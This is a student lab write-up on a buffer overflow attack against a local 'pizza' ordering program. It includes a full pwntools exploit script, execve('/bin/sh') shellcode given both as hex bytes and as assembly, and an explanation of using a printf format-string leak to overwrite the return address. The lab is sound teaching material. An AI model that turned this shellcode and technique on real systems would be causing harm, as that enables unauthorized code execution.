# Using Buffer Overflow to Inject Shellcode

The goal of this lab was to learn how to execute buffer overflowing on a test program that is prone to buffer overflowing to execute a piece of shellcode.

This shellcode will execute /bin/sh using exceve.

We learned how to use the PWN library to check the corefile when the program crashes to debug the injecting process. 

## Program

### Injection Python Program

Please try to run the program twice, because it may not work on the first one, but my testing showed that it would oftenly work on the second time. 

```python
#!/usr/bin/env python3

# Contron flow integrity violation 
# Author: Long Tran

# needs pwn tools
from pwn import *

#context.log_level = 'error'

# Executable and Linkable Format
elf = ELF("./pizza")
# specify the context
context(arch='amd64', os='linux', endian='little', word_size=64)

# my shellcode program
shellcode = [0x48, 0x31, 0xc0, 0x50, 0x48, 0x89, 0xe6, 0x48, 0x89, 0xe2, 0x48, 0xbb, 0x3b, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x88, 0xd8, 0x53, 0x48, 0x89, 0xe7, 0x48, 0xff, 0xc7, 0x0f, 0x05]
# do some printing about the shellcode
print("len of shellcode is", len(shellcode), "bytes")


# memory leak
# the input to leak the memory
input1 = b"%p " * (10)

# run the process
victim = process("./pizza")

# get the first output line
print(str(victim.recvline(), "latin-1"))
# send the input1 to leak the memory
victim.sendline(input1)
# retrieve the leaked memory
mem_leak = str(victim.recvline(), "latin-1")
mem_leak = mem_leak.split()

# input and output to pass a few steps 
victim.sendline(b"10")
for i in range(7):
    print(str(victim.recvline(), "latin-1"))

# the place where it crashed was 136
# the old base stack pointer is 128-135 (inclusive). 
# the return address was 136-144 (inclusive)
# set the payload size to be the codes to where the base pointer ends + the return address + plus the shell code
payload_size = 145 + len(shellcode)
# set it to A
payload = "A" * payload_size
# convert it to bytearray
payload = bytearray(payload, encoding="latin-1")

# exploit
# memory leak
loc = 7
address = int(mem_leak[loc], 16)
# add to the offset between that variable and the RSP
bp_addr = address # set the stack poitner to the leaked address
ret_addr = address + 0x20 
#print(hex(address))
ret_addr = ret_addr.to_bytes(8, byteorder="little")
bp_addr= bp_addr.to_bytes(8, byteorder="little")

# set the address
# base stack pointer
payload[128:136] = bp_addr #0x20
# return stack pointer
payload[136:144] = ret_addr  #0x20

# set the payload
payload[144:] = shellcode #b"B"*len(shellcode)#shellcode
print(len(payload), len(shellcode),  len(payload) - len(shellcode))
#print("shell code is", shellcode)
#print("paytload is", payload)
#print("mem leak", mem_leak)
# send the payload and wait
victim.sendline(payload)
for i in range(1):
    print(str(victim.recvline(), "latin-1"))
#
#victim.recvline()
#victim.sendline(b"10")

victim.interactive()
#victim.wait()

#core = victim.corefile
#rsp = core.rsp
#rbp = core.rbp
#rip = core.rip
#data = core.data
#print("rip is", hex(rip))
#print("rbp is", hex(rbp))
#print("rsp is", hex(rsp))
#for i in range(10):
#    my_addr = rsp - 8* i
#    print("memory is", hex(my_addr), hex(core.unpack(my_addr)))
#print("------------------")
#for i in range(10):
#    my_addr = rsp + 8* i
#    print("memory is", hex(my_addr), hex(core.unpack(my_addr)))
```

### Shellcode

My shell code is 31 bytes long. Here they are:

    48 31 c0 50 48 89 e6 48 89 e2 48 bb 3b 2f 62 69 6e 2f 73 68 88 d8 53 48 89 e7 48 ff c7 f 5

This was the orignal shellcode.
```
// Shellcode lab
// Author: Long Tran
.globl _start
.section .text
_start:
    // zero out rax
    xor %rax, %rax
    // push to have array of zeroes on the stack
    pushq %rax
    // %rsi and %rdx - set these to the address leading to an empty array of pointers.
    // we don't need a pointer to an empty string
    movq %rsp, %rsi
    movq %rsp, %rdx
    
    // %rdi - path
    // "/bin/sh 0x2F62696E2F7368
    // needs to change to little endianess
    movq $0x68732F6E69622F3b, %rbx 
    // retrieve 0x3b, put it in lower 8-bit of rax
    mov %bl, %al

    // push the string
    pushq %rbx
    // copy the stack pointer
    movq %rsp, %rdi
    // increase it by one to get past 0x3b
    inc %rdi

    syscall
```

## Explanation

### How I figured out the layout of the payload
The program into which we tried to inject is a pizza ordering program. It accepts 3 inputs:

1. Customer name. 
2. Number of Pizzas. 
3. Credit Card Numbers. 

I first tested to see which of these input can be overflowed. 

I tested by entering a certain number of A's until the program causes segmetnation fault. If it causes segmetnation fault, it means that the buffer was overflowed and writing over some other variables. 

The result was that the Customer name and the Credit card number can be overflowed.  

Thus, the goal was then to overflow them in some way that will put the shellcode program on the memory and overwrite the return address to that shellcode location so when the function ends, the instruction pointer return to that shellcode location and executes it (I was given the information that this program could execute codes on the stack). 

I was also taught through this program that there was a memory leak through printf(); that is, the printf statement was not called with any string containing %d or %s, allowing the users to enter %d or %s in the input string, and printing out the values on the stack of the function.

Thus, I put around 10 "%p" for the first input, which leaked 10 different 8-byte values on the stack. I then noticed that there was 3 values next to each other that looks like an address on the stack (0x7ff....). Checking the program with gdb showed that the stack address was constantly in that format. 

Hence, I tried to first change the previous base stack pointer. To do this, I tried to find the value where it first caused the segmentation fault, and I found that it was when I inserted 136 "A"s. Thus, it suggested to me that it was where the old stack pointer or the return address was.

Using the pwn tools in Python to see the corefile showed that the base stack pointer could be set in the range 128-135 (inclusive). I tested this by changing the value from "A" to "B" and see at which index does the base stack pointer in the corefile changes to those input values.    

Thus, it followed that the return address can be set in the range 136-143 (inclusive). 

I got a hint in class that we should set the return address to the stack pointer.  

Thus, from the 3 leaked values, I picked the first one. Running the program multiple times showed that the value seemed to be constantly 0x20 lower than the stack pointer when the program crashed. I saw this from the corefile by seeing the stack pointer at the end and the leaked value. 

I then tried to figure out exactly where to put my shellcode in the input so that it will be written to the stack pointer location when the program crashes.  

After multiple testing, I noticed that the stack pointer when the program crashes was not the stack pointer of the starting function, but the stack pointer of the caller function. This hinted that I need to insert the shellcode after the return address; that is, insert at a higher address. 

This makese sense because as was told in class, at the end of the function, the function would normally call 'leave' to deallocate the activation record of the current function, moving the stack pointer to the return address. Then, the 'ret' instruction will pop the return address, moving the stack pointer to the location right above it (above in terms of in higher memory location/lower in the stack).   

Hence, I tried to insert the shellcode right after the return address and it just works.

As a result, the layout of my bytearray payload is as follows: 

1. 0-127(inclusive): the value of 'A'. 
2. 128-135(inclusive): the leaked value. 
3. 136-143(inclusive): the leaked value + 0x20, which is expected to be the address right after the return address on the stack.  
4. 144-...: the shellcode.  


The reason why the shellcode is at an index higher than 144 is because at least in Linux and with a C program, array elements at higher indexes are stored at a higher memory address than the elements at lower indexes. Testing it with a C program on Ubunto showed that it was true. 

Thus, it also fits the theory I presented. 

### How the python progarm will work. 

The python program will run the pizza program, and at the 3rd input, it will input the payload. After that happens and the function asking for input ends, the program will change the instrtuction pointer to the address right above the stack location of the return address of the ended function. 

Hence, the shellcode will be executed and we will see the sh shell running. 
